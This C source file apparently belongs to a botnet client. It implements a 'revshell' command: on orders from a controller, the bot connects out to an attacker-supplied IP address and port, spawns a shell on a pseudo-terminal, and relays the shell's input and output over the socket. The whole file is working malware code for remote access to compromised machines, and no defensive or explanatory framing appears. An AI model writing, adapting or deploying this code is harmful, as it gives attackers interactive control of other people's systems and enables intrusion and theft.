#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pty.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#include "bot/client/client.h"
#include "bot/client/commands.h"
#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/utils/tokenizer.h"

void _open_reverse_shell(uint32_t addr, uint16_t port);
int reverse_shell_pid = -1;

/* the rev shell cmd */
void client_cmd_revshell(pclient_t client, pbytebuf_t buffer) {
  UNUSED_PARM(buffer);

  pbytebuf_t buf = bytebuf_new_read(client->data, client->hdr.len);
  if (reverse_shell_pid > 0 && waitpid(reverse_shell_pid, NULL, WNOHANG) == 0) {
    return;
  }

  uint32_t address = bytebuf_read_uint32(buf);
  uint16_t port = bytebuf_read_uint16(buf);

  // yay, we dont want it to block the main process
  reverse_shell_pid = fork();
  if (reverse_shell_pid == 0) {
    _open_reverse_shell(address, port);
    exit(0);
  }
}

/* opens a reverse shell */
void _open_reverse_shell(uint32_t addr, uint16_t port) {
  int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (sock_fd < 0) {
    LOG_ERROR("socket() failed: %s", strerror(errno));
    return;
  }

  struct sockaddr_in server_addr = {
      .sin_family = AF_INET,
      .sin_port = htons(port),
      .sin_addr = {htonl(addr)},
  };

  if (NON_BLOCK(sock_fd) < 0) {
    close(sock_fd);
    return;
  }

  int ret = connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr));
  if (ret < 0 && errno != EINPROGRESS) {
    LOG_ERROR("connect() failed: %s", strerror(errno));
    close(sock_fd);
    return;
  }

  struct pollfd pfd = {.fd = sock_fd, .events = POLLOUT};
  ret = poll(&pfd, 1, 10000);
  if (ret <= 0) {
    close(sock_fd);
    return;
  }

  if (!is_socket_connected(sock_fd)) {
    LOG_ERROR("getsockopt() failed: %s", strerror(errno));
    close(sock_fd);
    return;
  }

  /* We're finally connected, send a new line */
  if (write(sock_fd, "\r\n", 2) != 2) {
    close(sock_fd);
    return;
  }

  int pty_master_fd, pty_slave_fd;
  if (openpty(&pty_master_fd, &pty_slave_fd, NULL, NULL, NULL) < 0) {
    close(sock_fd);
    return;
  }

  pid_t pid = fork();
  if (pid < 0) {
    close(pty_master_fd);
    close(pty_slave_fd);
    close(sock_fd);
    return;
  }

  if (pid == 0) {
    close(pty_master_fd);
    setsid();

    ioctl(pty_slave_fd, TIOCSCTTY, 0);

    dup2(pty_slave_fd, STDIN_FILENO);
    dup2(pty_slave_fd, STDOUT_FILENO);
    dup2(pty_slave_fd, STDERR_FILENO);

    close(pty_slave_fd);
    close(sock_fd);

    int found_shell = -1;
    ptokenizer_t binaries = table_retrieve_list(TABLE_REVERSE_SHELL);

    /* check if one of our shells is accessible with X_OK  */
    for (int i = 0; i < binaries->size; i++) {
      if (access(binaries->tokens[i], X_OK) == 0) {
        found_shell = i;
        break;
      }
    }

    /* couldn't find a working shell, bailing */
    if (found_shell == -1) {
      LOG_ERROR("Finding working shell failed");
      tokenizer_free(binaries);
      exit(1);
    }

    /* exec, we ball */
    execl(binaries->tokens[found_shell], binaries->tokens[found_shell], NULL);
    tokenizer_free(binaries);
    exit(1);
  }

  close(pty_slave_fd);
  NON_BLOCK(pty_master_fd);
  NON_BLOCK(sock_fd);

  struct pollfd pfds[2] = {
      {.fd = sock_fd, .events = POLLIN},
      {.fd = pty_master_fd, .events = POLLIN},
  };

  char buffer[1024];
  int wait_status = 0;

  while (1) {
    pid_t w = waitpid(pid, &wait_status, WNOHANG);
    if (w != 0) {
      break;
    }

    ret = poll(pfds, 2, 1000);
    if (ret < 0) {
      if (errno == EINTR) continue;
      break;
    } else if (ret == 0) {
      continue;
    }

    // socket -> pty master
    if (pfds[0].revents & POLLIN) {
      ssize_t n = read(sock_fd, buffer, sizeof(buffer));
      if (n <= 0) break;

      ssize_t written = write(pty_master_fd, buffer, n);
      if (written <= 0) break;
    }

    // pty master -> socket
    if (pfds[1].revents & POLLIN) {
      ssize_t n = read(pty_master_fd, buffer, sizeof(buffer));
      if (n <= 0) break;

      ssize_t written = write(sock_fd, buffer, n);
      if (written <= 0) break;
    }
  }

  close(pty_master_fd);
  close(sock_fd);
}
